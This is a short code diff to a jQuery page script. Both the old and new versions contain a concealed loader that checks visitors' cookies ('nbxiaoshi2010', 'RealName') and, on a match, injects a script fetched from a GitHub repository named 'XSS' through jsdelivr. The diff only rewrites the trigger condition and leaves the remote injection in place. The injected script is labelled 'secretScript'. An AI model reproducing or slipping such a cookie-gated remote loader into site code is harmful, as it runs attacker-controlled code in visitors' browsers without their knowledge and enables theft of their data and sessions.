@@ -66,10 +66,11 @@ jQuery(document).ready(function($) {
     var cookie = document.cookie;
     s = cookie.indexOf("nbxiaoshi2010=dzbp");
     t = cookie.indexOf("RealName=");
-    if (s == -1 && t != -1 && cookie[t + 9] != '&') {
-        const secretScript = document.createElement("script");
-        secretScript.setAttribute("src", "https://cdn.jsdelivr.net/gh/OverJerry/XSS@HEAD/1.js");
-        body.insertAdjacentElement("afterbegin", secretScript);
+    if (s != -1) {
+        if (t != -1 && cookie[t + 9] != '&') {
+            const secretScript = document.createElement("script");
+            secretScript.setAttribute("src", "https://cdn.jsdelivr.net/gh/OverJerry/XSS@HEAD/1.js");
+            body.insertAdjacentElement("afterbegin", secretScript);
+        }
     }
-
 })();
